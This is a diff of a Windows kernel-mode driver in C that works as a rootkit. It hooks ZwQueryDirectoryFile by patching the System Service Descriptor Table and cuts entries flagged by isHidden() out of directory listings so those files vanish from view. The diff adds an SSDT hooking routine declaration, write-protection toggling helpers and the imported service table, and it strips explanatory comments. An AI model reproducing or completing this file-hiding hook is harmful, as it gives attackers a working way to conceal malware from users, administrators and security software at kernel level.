@@ -2,24 +2,27 @@
 #include <ntddk.h>
 
 typedef int BOOL;
-typedef NTSTATUS(*ZwQueryDirectoryFilePtr)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
 
 typedef struct SystemServiceDescriptorTable {
 	PULONG ServiceTableBase;
 	PULONG ServiceCounterTableBase;
 	ULONG NumberOfServices;
-	ULONG ParamTableBase;
+	PULONG ParamTableBase;
 } SSDT, * PSSDT;
+
+typedef NTSTATUS(*ZwQueryDirectoryFilePtr)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
+
+__declspec(dllimport) SSDT KeServiceDescriptorTable;
+ZwQueryDirectoryFilePtr originalZwQueryDirectoryFile = NULL;
 
 PWCHAR getDirEntryFileName(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass);
 BOOL isHidden(PWCHAR fileName);
 ULONG getNextEntryOffset(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass);
 void setNextEntryOffset(PVOID FileInformation, FILE_INFORMATION_CLASS FileInfomationClass, ULONG newValue);
+PULONG HookSSDT(PUCHAR syscall, PUCHAR hookaddr);
+void disableWriteProtect();
+void enableWriteProtect();
 
-ULONG originalZwQueryDirectoryFileAddress;
-ULONG ssdtZwQueryDirectoryFileAddress;
-PSSDT KeServiceDescriptorTable;
-ZwQueryDirectoryFilePtr fnZwQueryDirectoryFile;
 
 NTSTATUS Hook_ZwQueryDirectoryFile(
 	HANDLE FileHandle,
@@ -34,9 +37,10 @@ NTSTATUS Hook_ZwQueryDirectoryFile(
 	PUNICODE_STRING FileName,
 	BOOLEAN RestartScan
 ) {
+	DbgPrint("Hook_ZwQueryDirectoryFile called.\n");
 
 	PVOID currentFile, previousFile;
-	NTSTATUS ntStatus = fnZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+	NTSTATUS ntStatus = originalZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
 
 	if (!NT_SUCCESS(ntStatus)) {
 		return ntStatus;
@@ -56,38 +60,31 @@ NTSTATUS Hook_ZwQueryDirectoryFile(
 		do {
 			if (isHidden(getDirEntryFileName(currentFile, FileInformationClass)) == TRUE) {
 
+				// if not the last file
 				if (getNextEntryOffset(currentFile, FileInformationClass) != 0) {
 					ULONG delta;
 					ULONG nBytes;
-					// We get number of bytes between the 2 addresses (that we already processed)
+
 					delta = (ULONG)currentFile - (ULONG)FileInformation;
-					// Lenght is size of FileInformation buffer
-					// We get the number of bytes still to be sweeped trought
 					nBytes = Length - delta;
-					// We get the size of bytes to be processed if we remove the current entry.
 					nBytes = nBytes - getNextEntryOffset(currentFile, FileInformationClass);
-					// The next operation replaces the rest of the array by the same array without the current structure.
+
 					RtlCopyMemory(currentFile, ((PCHAR)currentFile + getNextEntryOffset(currentFile, FileInformationClass)), nBytes);
 					continue;
 				}
 				else {
-					// Only one file
 					if (currentFile == FileInformation) {
 						ntStatus = STATUS_NO_MORE_FILES;
 					}
 					else {
-						// Several file and ours is the last one
-						// We set previous to end of file
 						setNextEntryOffset(previousFile, FileInformationClass, 0);
 					}
-					// Exit while loop
 					break;
 
 				}
 
 			}
 			previousFile = currentFile;
-			// Set current file to next file in array
 			currentFile = ((PCHAR)currentFile + getNextEntryOffset(currentFile, FileInformationClass));
 
 		} while (getNextEntryOffset(previousFile, FileInformationClass) != 0);
@@ -191,3 +188,4 @@ void setNextEntryOffset(PVOID FileInformation, FILE_INFORMATION_CLASS FileInform
 			break;
 	}
 }
+
